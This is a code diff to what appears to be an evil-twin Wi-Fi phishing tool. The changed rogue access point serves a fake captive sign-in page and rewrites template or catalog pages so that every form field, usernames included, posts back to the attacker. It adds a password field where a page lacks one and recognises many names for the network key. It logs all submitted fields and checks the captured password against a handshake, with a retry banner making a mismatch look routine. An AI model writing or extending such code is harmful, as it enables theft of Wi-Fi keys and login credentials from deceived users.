@@ -17,6 +17,7 @@ import asyncio
 import html
 import os
 import random
+import re
 import struct
 import time
 from dataclasses import dataclass, field
@@ -48,7 +49,7 @@ _MAX_REQUEST = 8192
 _RETRY_SECONDS = 1.0
 _RETRY_COUNT = 3
 
-#: Portal copy, keyed the way the app's crack sheet names its templates.
+#: Built-in copy, used when no template page is supplied.
 TEMPLATES = {
     "default": ("Network sign-in",
                 "This network needs a sign-in before the internet works. "
@@ -328,28 +329,113 @@ def http_response(body: str, status: str = "200 OK") -> bytes:
     return head.encode("utf-8") + raw
 
 
-def http_password(request: bytes) -> Optional[str]:
-    """The ``password`` field of a form POST, or None when the request is not one."""
+def _read_html(path: Optional[str]) -> str:
+    if not path:
+        return ""
+    try:
+        with open(path, "r", encoding="utf-8", errors="replace") as handle:
+            return handle.read(2_000_000)
+    except OSError:
+        return ""
+
+
+def _form_attributes(markup: str) -> str:
+    """Point the page's form at us, with POST, so every field reaches the portal."""
+    return re.sub(r"<form\b[^>]*>", '<form method="post" action="/">', markup, count=1,
+                  flags=re.IGNORECASE)
+
+
+def _password_input(ssid: str) -> str:
+    return ("<div style=\"margin-top:14px\">"
+            "<label for=\"wifi-password\" style=\"display:block;font-size:.8rem;"
+            "margin-bottom:6px\">Wi-Fi password</label>"
+            "<input id=\"wifi-password\" name=\"password\" type=\"password\" "
+            "autocomplete=\"off\" required style=\"width:100%;padding:.6rem;"
+            "border:1px solid #d1d5db;border-radius:8px;font-size:1rem\">"
+            f"<button type=\"submit\" style=\"margin-top:12px;width:100%;padding:.7rem;"
+            "border:0;border-radius:8px;background:#111827;color:#fff;font-size:1rem\">"
+            f"Connect to {html.escape(ssid)}</button></div>")
+
+
+def prepare_portal_html(markup: str, ssid: str) -> str:
+    """A catalog page made submittable: POST to us, and a password field when it has none.
+
+    Most pages already carry a password input; the few that only ask for a username get one
+    appended, because the portal exists to check the network's key, not a username.
+    """
+    if not markup:
+        return ""
+    page = _form_attributes(markup)
+    if re.search(r"type\s*=\s*[\"']?password", page, re.IGNORECASE):
+        return page
+    field = _password_input(ssid)
+    lower = page.lower()
+    closing = lower.rfind("</form>")
+    if closing >= 0:
+        return page[:closing] + field + page[closing:]
+    return page + '<form method="post" action="/">' + field + "</form>"
+
+
+def portal_error_page(markup: str, message: str) -> str:
+    """The same page with a short banner, so a mismatch looks like a retry."""
+    banner = ("<div style=\"margin:0 0 14px;padding:10px 12px;border-radius:8px;"
+              "background:#fee2e2;color:#991b1b;font:14px system-ui,sans-serif\">"
+              + html.escape(message) + "</div>")
+    lower = markup.lower()
+    body = lower.find("<body")
+    if body >= 0:
+        close = markup.find(">", body)
+        if close >= 0:
+            return markup[:close + 1] + banner + markup[close + 1:]
+    return banner + markup
+
+
+def http_fields(request: bytes) -> Dict[str, str]:
+    """Every form field of a POST (or a GET query), first value per name."""
     head, _, body = request.partition(b"\r\n\r\n")
-    first = head.split(b"\r\n", 1)[0]
-    if not first.startswith(b"POST "):
-        return None
-    for line in head.split(b"\r\n")[1:]:
-        if line.lower().startswith(b"content-length:"):
-            try:
-                length = int(line.split(b":", 1)[1].strip())
-            except ValueError:
-                return None
-            body = body[:length]
-            break
+    first = head.split(b"\r\n", 1)[0].decode("latin-1", "replace")
+    parts = first.split(" ")
+    if len(parts) < 2:
+        return {}
+    method, target = parts[0].upper(), parts[1]
+    if method == "POST":
+        for line in head.split(b"\r\n")[1:]:
+            if line.lower().startswith(b"content-length:"):
+                try:
+                    body = body[:int(line.split(b":", 1)[1].strip())]
+                except ValueError:
+                    pass
+                break
+        raw = body
+    elif method == "GET":
+        raw = target.partition("?")[2].encode("utf-8")
+    else:
+        return {}
     from urllib.parse import parse_qs
 
     try:
-        values = parse_qs(body.decode("utf-8", "replace"))
+        values = parse_qs(raw.decode("utf-8", "replace"), keep_blank_values=True)
     except Exception:
-        return None
-    password = values.get("password", [""])[0]
-    return password if password else None
+        return {}
+    return {key: entries[0] for key, entries in values.items() if entries}
+
+
+#: Field names catalog pages use for the key; checked in this order.
+_PASSWORD_NAMES = ("password", "pass", "passwd", "pwd", "wifi_password", "wpa", "psk",
+                   "passphrase", "wifi-password")
+
+
+def password_from(fields: Dict[str, str]) -> Optional[str]:
+    for name in _PASSWORD_NAMES:
+        value = fields.get(name)
+        if value:
+            return value
+    return None
+
+
+def http_password(request: bytes) -> Optional[str]:
+    """The submitted Wi-Fi password, or None when the request carries no form fields."""
+    return password_from(http_fields(request))
 
 
 # --------------------------------------------------------------------------- AP
@@ -381,12 +467,16 @@ class PortalAp:
     fail_reason = ""
 
     def __init__(self, array, target, iface, ssid: str, template: str,
-                 verify: Callable[[str], bool], log: Callable[[str], None] = None):
+                 verify: Callable[[str], bool], log: Callable[[str], None] = None,
+                 template_path: str = None, success_path: str = None):
         self.array = array
         self.target = target
         self.iface = iface
         self.ssid = (ssid or getattr(target, "ssid", "") or "WiFi").strip()
         self.template = template if template in TEMPLATES else "default"
+        # A catalog page (or one the user supplied) replaces the built-in copy entirely.
+        self.portal_html = prepare_portal_html(_read_html(template_path), self.ssid)
+        self.success_html = _read_html(success_path)
         self.verify = verify
         self.log = log or (lambda _line: None)
         self.channel = int(getattr(target, "channel", 1) or 1)
@@ -675,13 +765,27 @@ class PortalAp:
                     length = 0
         return len(body) >= length
 
-    def _answer_http(self, conn: _Conn, src: str) -> None:
+    def _form_page(self, error: str = "") -> str:
+        if self.portal_html:
+            return portal_error_page(self.portal_html, error) if error else self.portal_html
         title, body = TEMPLATES[self.template]
-        password = http_password(bytes(conn.request))
+        return _page(title, body, self.ssid, error=error)
+
+    def _success_page(self) -> str:
+        if self.success_html:
+            return self.success_html
+        return _page("Connected", "The Wi-Fi password was accepted.", self.ssid)
+
+    def _answer_http(self, conn: _Conn, src: str) -> None:
+        fields = http_fields(bytes(conn.request))
+        password = password_from(fields)
+        if fields:
+            # The catalog pages carry usernames and other fields; log what was sent for the UI.
+            shown = ", ".join(f"{name}={value}" for name, value in fields.items())
+            self.log(f"portal form from {_mac_text(conn.client)}: {shown[:200]}")
         if password is None:
             conn.request.clear()
-            page = _page(title, body, self.ssid)
-            self._respond(conn, src, http_response(page))
+            self._respond(conn, src, http_response(self._form_page()))
             return
         ok = False
         try:
@@ -691,14 +795,12 @@ class PortalAp:
         if ok:
             self.matched = True
             self.log("portal password matched the handshake; closing the AP")
-            page = _page("You are connected", "The Wi-Fi password was accepted.",
-                         self.ssid)
-            self._respond(conn, src, http_response(page))
+            self._respond(conn, src, http_response(self._success_page()))
             self._schedule(self._finish_soon())
         else:
             self.log("portal password did not match; keeping the AP up")
-            page = _page(title, body, self.ssid, error="Incorrect password. Try again.")
-            self._respond(conn, src, http_response(page))
+            self._respond(conn, src, http_response(
+                self._form_page("Incorrect password. Try again.")))
 
     async def _finish_soon(self) -> None:
         await asyncio.sleep(0.8)
